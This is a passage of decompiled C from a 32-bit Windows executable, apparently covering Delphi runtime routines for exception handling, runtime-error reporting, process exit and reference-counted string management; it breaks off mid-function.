// Address range: 0x402b19 - 0x402b1e
int32_t function_402b19(void) {
    int32_t result = function_402c58((int32_t)&g111, (int32_t)&g111, (int32_t)&g111); // 0x402b19
    return result;
}

// Address range: 0x402b1e - 0x402b3d
int32_t function_402b1e(int32_t a1) {
    // 0x402b1e
    if (*(int32_t *)(a1 + 12) != 0) {
        // 0x402b29
        function_402b40();
    }
    // 0x402b37
    return function_402dbc((int32_t)&g111);
}

// Address range: 0x402b40 - 0x402b46
int32_t function_402b40(void) {
    // 0x402b40
    int32_t result; // 0x402b40
    return result;
}

// Address range: 0x402b48 - 0x402b56
int32_t function_402b48(void) {
    // 0x402b48
    int32_t result; // 0x402b48
    return result;
}

// Address range: 0x402b58 - 0x402b67
int32_t function_402b58(void) {
    // 0x402b58
    int32_t result; // 0x402b58
    return result;
}

// Address range: 0x402b68 - 0x402b83
int32_t function_402b68(void) {
    // 0x402b68
    int32_t result; // 0x402b68
    return result;
}

// Address range: 0x402b84 - 0x402ba5
int32_t function_402b84(void) {
    // 0x402b84
    int32_t v1; // 0x402b84
    return g14 == 0 ? v1 : 2;
}

// Address range: 0x402ba8 - 0x402bbd
int32_t function_402ba8(int32_t a1, int32_t a2) {
    // 0x402ba8
    return 0;
}

// Address range: 0x402bc0 - 0x402bd1
int32_t function_402bc0(int32_t a1) {
    // 0x402bc0
    int32_t result; // 0x402bc0
    if ((unsigned char)g14 < 2) {
        // 0x402bd0
        return result;
    }
    // 0x402bc9
    int32_t v1; // 0x402bc0
    return function_402ba8(result, v1);
}

// Address range: 0x402bd4 - 0x402bf2
int32_t function_402bd4(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402bd4
    int32_t result; // 0x402bd4
    int32_t v1; // 0x402bd4
    if (v1 == 0) {
        // 0x402bf1
        return result;
    }
    char v2 = v1;
    int32_t v3 = *(int32_t *)(v1 + 1); // 0x402bd8
    result = v3;
    if (v2 != -23 && v2 == -21) {
        // 0x402be5
        result = 0x1000000 * v3 / 0x1000000;
    }
    // 0x402bf1
    return result;
}

// Address range: 0x402bf4 - 0x402c1b
int32_t function_402bf4(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402bf4
    int32_t result; // 0x402bf4
    if ((unsigned char)g14 >= 2) {
        // 0x402bfd
        int32_t v1; // 0x402bf4
        int32_t v2; // 0x402bf4
        int32_t v3; // 0x402bf4
        function_402bd4(v3, v1, v2);
        int32_t v4; // bp-16, 0x402bf4
        result = &v4;
    }
    // 0x402c1a
    return result;
}

// Address range: 0x402c1c - 0x402c38
int32_t function_402c1c(void) {
    // 0x402c1c
    int32_t result; // 0x402c1c
    return result;
}

// Address range: 0x402c38 - 0x402c56
int32_t function_402c38(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402c38
    int32_t v1; // bp-8, 0x402c38
    int32_t * v2 = &v1; // 0x402c41
    if ((unsigned char)g14 >= 2) {
        int32_t v3 = 0xeedfae3; // bp-24, 0x402c48
        v2 = &v3;
    }
    // 0x402c53
    return *(int32_t *)((int32_t)v2 + 4);
}

// Address range: 0x402c58 - 0x402d82
int32_t function_402c58(int32_t a1, int32_t ExceptionInfo2, int32_t a3) {
    // 0x402c58
    if ((*(int32_t *)(ExceptionInfo2 + 4) & 6) != 0) {
        // 0x402d7c
        return 1;
    }
    int32_t v1 = *(int32_t *)ExceptionInfo2; // 0x402c69
    int32_t v2 = *(int32_t *)(ExceptionInfo2 + 24); // 0x402c75
    int32_t v3; // 0x402c58
    if (v1 == 0xeedfade) {
        goto lab_0x402ce5;
    } else {
        // 0x402c77
        if (ExceptionInfo2 == 0 || g42 == 0) {
            // 0x402d7c
            return 1;
        }
        // 0x402c95
        v2 = ExceptionInfo2;
        if (v1 == 0xeefface) {
            goto lab_0x402ce5;
        } else {
            int32_t ExceptionInfo = function_402b84(); // 0x402ca5
            v2 = ExceptionInfo;
            if (g15 != 0 == g14 == 0) {
                // 0x402cbc
                v3 = a3;
                if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo) == 0) {
                    // 0x402d7c
                    return 1;
                }
                goto lab_0x402d0c;
            } else {
                goto lab_0x402ce5;
            }
        }
    }
  lab_0x402ce5:
    // 0x402ce5
    v3 = ExceptionInfo2;
    if (g15 > 1 == g14 == 0) {
        // 0x402cf7
        v3 = v2;
        if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)ExceptionInfo2) == 0) {
            // 0x402d7c
            return 1;
        }
    }
    goto lab_0x402d0c;
  lab_0x402d0c:;
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402d0c
    *v4 = *v4 | 2;
    __readfsdword(0);
    int32_t * v5 = (int32_t *)function_404270(); // 0x402d39
    int32_t v6 = *v5; // bp-56, 0x402d39
    *v5 = (int32_t)&v6;
    int32_t v7; // 0x402c58
    *(int32_t *)(v7 + 4) = 0x402d5c;
    return function_402bc0(v6);
}

// Address range: 0x402d84 - 0x402dba
int32_t function_402d84(int32_t a1, int32_t a2) {
    // 0x402d84
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402d95
        *(int32_t *)(a1 + 4) = 0x402db4;
        int32_t v1; // 0x402d84
        int32_t v2; // 0x402d84
        int32_t v3; // 0x402d84
        int32_t v4; // 0x402d84
        function_402bf4(v4, v2, v1, v3);
    }
    // 0x402db4
    return 1;
}

// Address range: 0x402dbc - 0x402e0d
int32_t function_402dbc(int32_t a1) {
    // 0x402dbc
    *(int32_t *)(a1 + 4) = 0x402e07;
    int32_t * v1 = (int32_t *)function_404270(); // 0x402dcc
    int32_t v2 = *v1; // 0x402dcc
    *v1 = *(int32_t *)v2;
    int32_t v3 = *(int32_t *)(v2 + 12); // 0x402dda
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402ddd
    *v4 = *v4 & -3;
    if (*(int32_t *)v3 != 0xeedfade) {
        // 0x402de9
        function_402b68();
    }
    // 0x402df6
    int32_t v5; // 0x402dbc
    *(int32_t *)v5 = *(int32_t *)__readfsdword(0);
    return 1;
}

// Address range: 0x402e10 - 0x402e3f
int32_t function_402e10(int32_t a1) {
    int32_t * v1 = (int32_t *)function_404270(); // 0x402e15
    *v1 = *(int32_t *)*v1;
    __writefsdword(0, *(int32_t *)a1);
    return function_402c1c();
}

// Address range: 0x402e3f - 0x402e40
int32_t function_402e3f(void) {
    // 0x402e3f
    int32_t result; // 0x402e3f
    return result;
}

// Address range: 0x402e40 - 0x402e55
int32_t function_402e40(int32_t a1, int32_t result) {
    // 0x402e40
    __writefsdword(0, result);
    return result;
}

// Address range: 0x402e55 - 0x402e56
int32_t function_402e55(void) {
    // 0x402e55
    int32_t result; // 0x402e55
    return result;
}

// Address range: 0x402e58 - 0x402ef4
int32_t function_402e58(int32_t a1) {
    // 0x402e58
    function_402548();
    // UNREACHABLE
}

// Address range: 0x402ef4 - 0x402ef8
int32_t function_402ef4(int32_t a1) {
    // 0x402ef4
    int32_t result; // 0x402ef4
    return result;
}

// Address range: 0x402ef8 - 0x402f95
int32_t function_402ef8(int32_t a1, int32_t a2) {
    int32_t ExceptionInfo = a1;
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x402f92
        return 0;
    }
    // 0x402f09
    if (g14 == 0) {
        // 0x402f12
        if (UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo) == 0) {
            // 0x402f92
            return 0;
        }
    }
    // 0x402f21
    if (g42 == 0) {
        function_402e58((int32_t)&g111);
        // UNREACHABLE
    }
    // 0x402f6d
    function_402c38(0, a2, ExceptionInfo);
    function_403364((int32_t)&g42);
    // UNREACHABLE
}

// Address range: 0x402f98 - 0x402fb5
int32_t function_402f98(void) {
    // 0x402f98
    int32_t v1; // 0x402f98
    int32_t result = v1 - 12; // 0x402f9a
    int32_t v2 = __readfsdword(0); // 0x402f9d
    __writefsdword(0, result);
    *(int32_t *)result = v2;
    *(int32_t *)(v1 - 8) = 0x402ef8;
    g77 = result;
    return result;
}

// Address range: 0x402fb8 - 0x402fe0
int32_t function_402fb8(void) {
    // 0x402fb8
    if (g77 == 0) {
        // 0x402fdf
        return 0;
    }
    int32_t v1 = __readfsdword(0); // 0x402fc3
    int32_t v2 = v1; // 0x402fc8
    if (g77 == v1) {
        int32_t result = *(int32_t *)g77; // 0x402fca
        __writefsdword(0, result);
        return result;
    }
    int32_t result2 = g77; // 0x402fd5
    while (v2 != -1) {
        int32_t * v3 = (int32_t *)v2;
        v2 = *v3;
        if (v2 == g77) {
            // 0x402fdb
            result2 = *(int32_t *)g77;
            *v3 = result2;
            return result2;
        }
        result2 = g77;
    }
  lab_0x402fdf:
    // 0x402fdf
    return result2;
}

// Address range: 0x402fe0 - 0x40303f
int32_t function_402fe0(void) {
    // 0x402fe0
    if (g78 == 0) {
        // 0x40303a
        return 0;
    }
    int32_t v1 = __readfsdword(0); // bp-28, 0x403000
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g79; // 0x403008
    if (g79 < 1) {
        // 0x40301c
        __writefsdword(0, v1);
        // 0x40303a
        return 0;
    }
    v2--;
    while (v2 >= 0 == (v2 != 0)) {
        // 0x40300a
        v2--;
    }
    // 0x40301c
    g79 = v2;
    // 0x40301c
    __writefsdword(0, v1);
    // 0x40303a
    return 0;
}

// Address range: 0x403040 - 0x40309f
int32_t function_403040(int32_t a1) {
    // 0x403040
    if (g78 == 0) {
        // 0x40309a
        return 0;
    }
    uint32_t v1 = *(int32_t *)g78; // 0x40304f
    int32_t v2 = __readfsdword(0); // bp-28, 0x40305e
    __writefsdword(0, (int32_t)&v2);
    if (v1 >= 1) {
        // 0x403068
        g79 = v1;
    }
    // 0x40307c
    __writefsdword(0, v2);
    // 0x40309a
    return 0;
}

// Address range: 0x4030a0 - 0x403167
int32_t function_4030a0(int32_t a1) {
    // 0x4030a0
    int32_t v1; // 0x4030a0
    char * v2 = (char *)(v1 - 60); // 0x4030b0
    __asm_rep_movsd_memcpy(v2, (char *)&g76, 11);
    g76 = v2;
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x4030e0
    int32_t v4; // 0x4030a0
    g79 = *v3 != 0 ? 0 : v4;
    g43 = 0x401068;
    g44 = 0x401070;
    function_402f98();
    g81 = (char)*v3 + 1;
    if (g45 == 0) {
        // 0x403148
        *(char *)&g47 = 1;
    }
    // 0x403155
    if (*v3 == 1) {
        // 0x40315f
        int32_t v5; // 0x4030a0
        return function_403040(v5);
    }
    function_403280();
    // UNREACHABLE
}

// Address range: 0x403167 - 0x403168
int32_t function_403167(void) {
    // 0x403167
    int32_t result; // 0x403167
    return result;
}

// Address range: 0x403168 - 0x4031c2
int32_t function_403168(void) {
    int32_t v1 = 16; // 0x403172
    int32_t v2 = g7;
    int64_t v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2; // 0x403180
    *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
    int32_t v4 = v3 / 10; // 0x403194
    v1--;
    while (v4 != 0) {
        // 0x403178
        v2 = v4;
        v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2;
        *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
        v4 = v3 / 10;
        v1--;
    }
    int32_t v5 = 28; // 0x40319f
    uint32_t v6 = g8;
    char v7 = *(char *)((v6 & 15) + (int32_t)&g19); // 0x4031a9
    *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
    int32_t result = v6 / 16; // 0x4031b6
    v5--;
    while (v6 >= 16) {
        // 0x4031a4
        v6 = result;
        v7 = *(char *)((v6 & 15) + (int32_t)&g19);
        *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
        result = v6 / 16;
        v5--;
    }
    // 0x4031be
    return result;
}

// Address range: 0x4031c4 - 0x4031f1
int32_t function_4031c4(void) {
    int32_t v1 = g7; // 0x4031c6
    g7 = 0;
    __asm_rep_movsd_memcpy((char *)&g76, g76, 11);
    return v1 == 0;
}

// Address range: 0x4031f1 - 0x4031f2
int32_t function_4031f1(void) {
    // 0x4031f1
    int32_t result; // 0x4031f1
    return result;
}

// Address range: 0x4031f4 - 0x403273
int32_t function_4031f4(void) {
    // 0x4031f4
    int32_t nStdHandle; // 0x4031f4
    if (g51 != 0) {
        // 0x4031fe
        WriteFile(GetStdHandle(nStdHandle), &g111, (int32_t)&g111, &g111, (struct _OVERLAPPED *)&g111);
        bool result = WriteFile(GetStdHandle(0), &g111, (int32_t)&g111, &g111, (struct _OVERLAPPED *)&g111); // 0x40324e
        return result;
    }
    // 0x403255
    int32_t result2; // 0x4031f4
    if (g16 == 0) {
        // 0x40325e
        result2 = MessageBoxA((int32_t *)nStdHandle, NULL, "Error", (int32_t)"Runtime error     at 00000000");
    }
    // 0x403271
    return result2;
}

// Address range: 0x403280 - 0x403353
int32_t function_403280(void) {
    // 0x403280
    if (g81 == 0 && g50 != 0) {
        // 0x40329e
        g50 = 0;
    }
    // 0x4032af
    if (g8 != 0) {
        // 0x4032b8
        function_403168();
        function_4031f4();
        g8 = 0;
    }
    // 0x4032c9
    int32_t v1; // bp-16, 0x403280
    int32_t v2 = &v1;
    int32_t v3 = &g7; // 0x40334d
    int32_t v4; // 0x403280
    int32_t v5; // 0x403280
    int32_t v6; // 0x403280
    while (true) {
      lab_0x4032c9:
        // 0x4032c9
        v4 = v3;
        v5 = v2;
        if (g81 == 2) {
            // 0x4032cf
            if (*(int32_t *)v4 == 0) {
                // 0x4032d4
                g79 = 0;
            }
        }
        // 0x4032d9
        function_402fe0();
        if (g81 < 2) {
            goto lab_0x4032e9;
        } else {
            // 0x4032e4
            v6 = v5;
            if (*(int32_t *)v4 == 0) {
                goto lab_0x40330a;
            } else {
                goto lab_0x4032e9;
            }
        }
    }
  lab_0x403328:
    // 0x403328
    *(int32_t *)(v2 - 4) = *(int32_t *)v4;
    ExitProcess((int32_t)&g111);
    // UNREACHABLE
  lab_0x4032e9:
    // 0x4032e9
    v6 = v5;
    if (g80 != 0) {
        // 0x4032f0
        function_403f20();
        int32_t v7 = *(int32_t *)(g80 + 16); // 0x4032f8
        v6 = v5;
        if (!((v7 == 0 | v7 == *(int32_t *)(g80 + 4)))) {
            int32_t v8 = v5 - 4; // 0x403304
            *(int32_t *)v8 = v7;
            FreeLibrary(&g111);
            v6 = v8;
        }
    }
    goto lab_0x40330a;
  lab_0x40330a:
    // 0x40330a
    v2 = v6;
    function_402fb8();
    if (g81 != 0) {
        // 0x40331e
        function_4031c4();
    }
    // 0x403323
    if (g76 == NULL) {
        // break -> 0x403328
        goto lab_0x403328;
    }
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x403341
    *v9 = v4;
    __asm_rep_movsd_memcpy((char *)&g76, g76, 11);
    v3 = *v9;
    goto lab_0x4032c9;
}

// Address range: 0x403353 - 0x403358
int32_t function_403353(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x403353
    int32_t result; // 0x403353
    return result;
}

// Address range: 0x403358 - 0x403362
int32_t function_403358(void) {
    // 0x403358
    function_403280();
    // UNREACHABLE
}

// Address range: 0x403362 - 0x403363
int32_t function_403362(void) {
    // 0x403362
    int32_t result; // 0x403362
    return result;
}

// Address range: 0x403364 - 0x40336f
int32_t function_403364(int32_t a1) {
    // 0x403364
    g8 = a1;
    return function_403358();
}

// Address range: 0x40336f - 0x403370
int32_t function_40336f(void) {
    // 0x40336f
    int32_t result; // 0x40336f
    return result;
}

// Address range: 0x403370 - 0x403393
int32_t function_403370(void) {
    // 0x403370
    int32_t result; // 0x403370
    if (result == 0) {
        // 0x403392
        return result;
    }
    // 0x403376
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x40337c
    int32_t v2 = *v1; // 0x40337c
    if (v2 < 1) {
        // 0x403392
        return result;
    }
    int32_t v3 = v2 - 1; // 0x403382
    *v1 = v3;
    if (v3 == 0) {
        // 0x403388
        function_4024d8();
    }
    // 0x403392
    return result;
}

// Address range: 0x403394 - 0x4033c3
int32_t function_403394(void) {
    int32_t v1; // 0x403394
    int32_t * v2 = (int32_t *)v1; // 0x40339a
    int32_t v3 = *v2; // 0x40339a
    int32_t v4; // 0x403394
    int32_t v5 = v4; // 0x40339e
    int32_t * v6; // 0x4033a6
    uint32_t v7; // 0x4033a6
    int32_t v8; // 0x4033ac
    if (v3 != 0) {
        // 0x4033a0
        *v2 = 0;
        v6 = (int32_t *)(v3 - 8);
        v7 = *v6;
        v5 = v4;
        if (v7 >= 1) {
            // 0x4033ac
            v8 = v7 - 1;
            *v6 = v8;
            v5 = v4;
            if (v8 == 0) {
                // 0x4033b2
                v5 = function_4024d8();
            }
        }
    }
    int32_t result = v5;
    int32_t v9; // 0x403394
    int32_t v10 = v9 - 1; // 0x4033bd
    v1 += 4;
    while (v10 != 0) {
        int32_t v11 = result;
        v2 = (int32_t *)v1;
        v3 = *v2;
        v5 = v11;
        if (v3 != 0) {
            // 0x4033a0
            *v2 = 0;
            v6 = (int32_t *)(v3 - 8);
            v7 = *v6;
            v5 = v11;
            if (v7 >= 1) {
                // 0x4033ac
                v8 = v7 - 1;
                *v6 = v8;
                v5 = v11;
                if (v8 == 0) {
                    // 0x4033b2
                    v5 = function_4024d8();
                }
            }
        }
        // 0x4033ba
        result = v5;
        v10--;
        v1 += 4;
    }
    // 0x4033c0
    return result;
}

// Address range: 0x4033c4 - 0x403407
int32_t function_4033c4(void) {
    int32_t v1 = 0; // 0x4033c6
    int32_t v2; // 0x4033c4
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)(v2 - 8); // 0x4033c8
        int32_t v4 = *v3; // 0x4033c8
        int32_t v5 = v4 + 1; // 0x4033cb
        if (v5 < 0 == (v5 & (v4 ^ -0x80000000)) < 0 == (v5 != 0)) {
            // 0x4033e8
            *v3 = v5;
        } else {
            // 0x4033ce
            v1 = function_403408();
            function_4025bc();
        }
    }
    // 0x4033ec
    int32_t v6; // 0x4033c4
    *(int32_t *)v6 = v1;
    int32_t result = 0; // 0x4033f0
    if (v6 == 0) {
        // 0x403406
        return result;
    }
    int32_t * v7 = (int32_t *)(v6 - 8); // 0x4033f2
    int32_t v8 = *v7; // 0x4033f2
    if (v8 < 1) {
        // 0x403406
        return result;
    }
    int32_t v9 = v8 - 1; // 0x4033f8
    *v7 = v9;
    if (v9 == 0) {
        // 0x4033fe
        result = function_4024d8();
    }
    // 0x403406
    return result;
}

// Address range: 0x403408 - 0x403433
int32_t function_403408(void) {
    // 0x403408
    int32_t v1; // 0x403408
    if (v1 < 1) {
        // 0x403430
        return 0;
    }
    int32_t v2 = function_4024b8(); // 0x403414
    *(int16_t *)(v2 + (v1 + 8 & -2)) = 0;
    *(int32_t *)v2 = 1;
    return v2 + 8;
}

// Address range: 0x403434 - 0x403462
int32_t function_403434(void) {
    int32_t v1 = function_403408(); // 0x40343f
    int32_t v2; // 0x403434
    if (v2 != 0) {
        // 0x40344c
        function_4025bc();
    }
    int32_t result = function_403370(); // 0x403457
    int32_t v3; // 0x403434
    *(int32_t *)v3 = v1;
    return result;
}

// Address range: 0x403464 - 0x403473
int32_t function_403464(void) {
    // 0x403464
    return function_403434();
}

// Address range: 0x403474 - 0x4034a0
int32_t function_403474(void) {
    // 0x403474
    int32_t v1; // 0x403474
    if (v1 == 0 || *(char *)v1 == 0) {
        // 0x40349b
        return function_403434();
    }
    int32_t v2; // 0x403474
    while (*(char *)(v2 + 1) != 0) {
        // 0x403484
        if (*(char *)(v2 + 2) == 0) {
            // break -> 0x40349b
            break;
        }
        // 0x403489
        if (*(char *)(v2 + 3) == 0) {
            // break -> 0x40349b
            break;
        }
        int32_t v3 = v2 + 4; // 0x40348e
        v2 = v3;
        if (*(char *)v3 == 0) {
            // break -> 0x40349b
            break;
        }
    }
    // 0x40349b
    return function_403434();
}

// Address range: 0x4034a0 - 0x4034a1
int32_t function_4034a0(void) {
    // 0x4034a0
    int32_t result; // 0x4034a0
    return result;
}

// Address range: 0x4034a4 - 0x4034ae
int32_t function_4034a4(void) {
    // 0x4034a4
    return function_403434();
}

// Address range: 0x4034ae - 0x4034af
int32_t function_4034ae(void) {
    // 0x4034ae
    int32_t result; // 0x4034ae
    return result;
}

// Address range: 0x4034b0 - 0x4034c7
int32_t function_4034b0(void) {
    // 0x4034b0
    return function_403434();
}

// Address range: 0x4034c7 - 0x4034c8
int32_t function_4034c7(void) {
    // 0x4034c7
    int32_t result; // 0x4034c7
    return result;
}

// Address range: 0x4034c8 - 0x4034d0
int32_t function_4034c8(void) {
    int32_t result = 0; // 0x4034ca
    int32_t v1; // 0x4034c8
    if (v1 != 0) {
        // 0x4034cc
        result = *(int32_t *)(v1 - 4);
    }
    // 0x4034cf
    return result;
}

// Address range: 0x4034d0 - 0x403514
int32_t function_4034d0(void) {
    // 0x4034d0
    int32_t v1; // 0x4034d0
    int32_t result; // 0x4034d0
    if (v1 == 0) {
        // 0x403513
        return result;
    }
    if (result == 0) {
        function_4033c4();
    }
    // 0x4034de
    function_403854();
    return function_4025bc();
}

// Address range: 0x403514 - 0x403587
int32_t function_403514(void) {
    // 0x403514
    int32_t v1; // 0x403514
    if (v1 == 0) {
        // 0x403579
        return function_4033c4();
    }
    int32_t v2; // 0x403514
    int32_t v3; // 0x403514
    if (v3 == 0) {
        v2 = function_4033c4();
    }
    // 0x403520
    if (v1 == v2) {
        // 0x403580
        return function_4034d0();
    }
    if (v3 != v2) {
        // 0x403528
        function_4033c4();
        return function_4034d0();
    }
    int32_t v4 = function_403408(); // 0x403544
    function_4025bc();
    function_4025bc();
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)(v4 - 8); // 0x40356d
        *v5 = *v5 - 1;
    }
    // 0x403570
    return function_4033c4();
}

// Address range: 0x403587 - 0x403588
int32_t function_403587(void) {
    // 0x403587
    int32_t result; // 0x403587
    return result;
}

// Address range: 0x403588 - 0x403611
int32_t function_403588(int32_t result) {
    // 0x403588
    int32_t v1; // bp-20, 0x403588
    int32_t v2 = (int32_t)&v1 + 20; // 0x403591
    int32_t v3; // 0x403588
    int32_t v4 = *(int32_t *)(v2 + 4 * v3); // 0x403591
    int32_t v5; // 0x403588
    int32_t v6 = v3 + (int32_t)!((v4 == 0 | v5 != v4)); // 0x4035b8
    int32_t v7 = v4 == 0 | v5 != v4 ? 0 : v4;
    int32_t v8 = *(int32_t *)(4 * v6 + v2); // 0x4035a7
    int32_t v9 = v7; // 0x4035ad
    if (v8 != 0) {
        // 0x4035af
        v9 = v7 != v8 ? v7 : 0;
    }
    int32_t v10 = v9;
    v6--;
    while (v6 != 0) {
        // 0x4035a7
        v7 = v10;
        v8 = *(int32_t *)(4 * v6 + v2);
        v9 = v7;
        if (v8 != 0) {
            // 0x4035af
            v9 = v7 != v8 ? v7 : 0;
        }
        // 0x4035b8
        v10 = v9;
        v6--;
    }
    int32_t v11; // 0x403588
    int32_t v12; // 0x403588
    int32_t v13; // bp-24, 0x403588
    if (v10 == 0) {
        // 0x4035d6
        v13 = function_403408();
        v12 = 0;
    } else {
        // 0x4035bf
        v13 = function_403854();
        v11 = v3 - 1;
        v12 = v1;
    }
    int32_t v14 = v11; // 0x4035f2
    if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
        // 0x4035e8
        function_4025bc();
    }
    // 0x4035f2
    v14--;
    while (v14 != 0) {
        // 0x4035de
        if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
            // 0x4035e8
            function_4025bc();
        }
        // 0x4035f2
        v14--;
    }
    if (v12 != 0) {
        // 0x403607
        return result;
    }
    // 0x4035fb
    if (v13 != 0) {
        int32_t * v15 = (int32_t *)(v13 - 8); // 0x4035ff
        *v15 = *v15 - 1;
    }
    // 0x403602
    function_4033c4();
    // 0x403607
    return result;
}

// Address range: 0x403611 - 0x403612
int32_t function_403611(void) {
    // 0x403611
    int32_t result; // 0x403611
    return result;
}

// Address range: 0x403614 - 0x4036b6
int32_t function_403614(void) {
    // 0x403614
    int32_t v1; // 0x403614
    int32_t v2; // 0x403614
    if (v2 == v1) {
        // 0x40369d
        int32_t result; // 0x403614
        return result;
    }
    if (v2 == 0) {
        // 0x40369d
        return -*(int32_t *)(v1 - 4);
    }
    uint32_t result2 = *(int32_t *)(v2 - 4);
    if (v1 == 0) {
        // 0x40369d
        return result2;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x40362e
    int32_t result3 = result2 - v3; // 0x403631
    uint32_t v4 = result2 < v3 | result3 == 0 ? result2 : v3;
    int32_t v5 = v4 / 4; // 0x40363b
    int32_t v6; // 0x403614
    int32_t v7; // 0x403614
    if (v4 < 4) {
        goto lab_0x403663;
      lab_0x403663:;
        int32_t v8 = v4 & 3; // 0x403664
        if (v8 == 0) {
            // 0x40369d
            return 2 * result3;
        }
        uint32_t v9 = *(int32_t *)v7; // 0x403669
        uint32_t v10 = *(int32_t *)v6; // 0x40366b
        if ((char)v9 != (char)v10) {
            // 0x40369d
            return result3;
        }
        int32_t v11 = v8 - 1; // 0x403671
        if (v11 == 0) {
            // 0x40369d
            return 2 * result3;
        }
        // 0x403674
        if ((char)(v9 / 256) != (char)(v10 / 256)) {
            // 0x40369d
            return result3;
        }
        if (v11 == 1) {
            // 0x40369d
            return 2 * result3;
        }
        // 0x40367b
        if (((v10 ^ v9) & 0xff0000) != 0) {
            // 0x40369d
            return result3;
        }
        // 0x40369d
        return 2 * result3;
    }
    int32_t v12; // 0x403614
    int32_t v13 = v12;
    int32_t v14; // 0x403614
    while (*(int32_t *)v14 == *(int32_t *)v13) {
        int32_t v15 = v14 + 4;
        if (v5 == 1) {
            // 0x40365d
            v7 = v15;
            v6 = v13 + 4;
            goto lab_0x403663;
        }
        // 0x403648
        if (*(int32_t *)v15 != *(int32_t *)(v13 + 4)) {
            // break -> 0x40369d
            break;
        }
        int32_t v16 = v14 + 8; // 0x403652
        int32_t v17 = v13 + 8; // 0x403655
        v5 -= 2;
        v14 = v16;
        v7 = v16;
        v6 = v17;
        if (v5 == 0) {
            goto lab_0x403663;
        }
        v13 = v17;
    }
    // 0x40369d
    return result3;
}

// Address range: 0x4036b8 - 0x4036c7
int32_t function_4036b8(void) {
    // 0x4036b8
    int32_t result; // 0x4036b8
    if (result == 0) {
        // 0x4036c6
        return result;
    }
    int32_t * v1 = (int32_t *)(result - 8); // 0x4036bc
    uint32_t v2 = *v1 + 1; // 0x4036bf
    if (v2 >= 1) {
        // 0x4036c2
        *v1 = v2;
    }
    // 0x4036c6
    return result;
}

// Address range: 0x4036c8 - 0x4036d4
int32_t function_4036c8(void) {
    // 0x4036c8
    int32_t v1; // 0x4036c8
    return v1 == 0 ? 0x4036cd : v1;
}

// Address range: 0x4036d4 - 0x403715
int32_t function_4036d4(void) {
    // 0x4036d4
    int32_t v1; // 0x4036d4
    if (v1 == 0 || *(int32_t *)(v1 - 8) == 1) {
        // 0x403712
        return 0;
    }
    int32_t result = function_403408(); // 0x4036e6
    *(int32_t *)v1 = result;
    function_4025bc();
    int32_t * v2 = (int32_t *)(result - 8); // 0x4036fb
    int32_t v3 = *v2; // 0x4036fb
    if (v3 < 1) {
        // 0x403712
        return result;
    }
    int32_t v4 = v3 - 1; // 0x403701
    *v2 = v4;
    int32_t result2 = result; // 0x403705
    if (v4 == 0) {
        // 0x403707
        result2 = function_4024d8();
    }
    // 0x403712
    return result2;
}

// Address range: 0x403718 - 0x40371d
int32_t function_403718(int32_t a1, int32_t a2, int32_t a3) {
    // 0x403718
    return function_4036d4();
}

// Address range: 0x40371d - 0x40371e
int32_t function_40371d(void) {
    // 0x40371d
    int32_t result; // 0x40371d
    return result;
}

// Address range: 0x403720 - 0x403725
int32_t function_403720(void) {
    // 0x403720
    return function_4036d4();
}

// Address range: 0x403725 - 0x403726
int32_t function_403725(void) {
    // 0x403725
    int32_t result; // 0x403725
    return result;
}

// Address range: 0x403728 - 0x403767
int32_t function_403728(int32_t * a1) {
    // 0x403728
    int32_t v1; // 0x403728
    if (v1 == 0) {
        // 0x403763
        return function_403370();
    }
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x40372d
    if (v2 == 0) {
        // 0x403763
        return function_403370();
    }
    int32_t v3; // 0x403728
    int32_t v4; // 0x403728
    if (v3 < 1) {
        if (v4 < 0) {
            // 0x403763
            return function_403370();
        }
        // 0x403763
        return function_403434();
    }
    if (v4 < 0 || v3 - 1 >= v2) {
        // 0x403763
        return function_403370();
    }
    // 0x403763
    return function_403434();
}

// Address range: 0x403767 - 0x403768
int32_t function_403767(void) {
    // 0x403767
    int32_t result; // 0x403767
    return result;
}

// Address range: 0x403768 - 0x4037b0
int32_t function_403768(void) {
    // 0x403768
    int32_t v1; // 0x403768
    int32_t v2; // 0x403768
    int32_t v3; // 0x403768
    int32_t result = function_403718(v3, v2, v1); // 0x403771
    if (result == 0) {
        // 0x4037ac
        return 0;
    }
    // 0x40377c
    int32_t v4; // 0x403768
    if (v4 < 1) {
        // 0x4037ac
        return result;
    }
    int32_t result2 = result; // 0x403784
    int32_t v5; // 0x403768
    if (!((v5 < 1 | *(int32_t *)(result - 4) <= v4 - 1))) {
        // 0x40378a
        function_4025bc();
        result2 = function_403854();
    }
    // 0x4037ac
    return result2;
}

// Address range: 0x4037b0 - 0x40380b
int32_t function_4037b0(void) {
    int32_t result = 0; // 0x4037b2
    int32_t v1; // 0x4037b0
    if (v1 != 0) {
        // 0x4037b4
        function_403854();
        function_4025bc();
        result = function_4025bc();
    }
    // 0x40380a
    return result;
}

// Address range: 0x40380c - 0x403851
int32_t function_40380c(void) {
    // 0x40380c
    int32_t v1; // 0x40380c
    int32_t v2; // 0x40380c
    if (v1 == 0 || v2 == 0) {
        // 0x403845
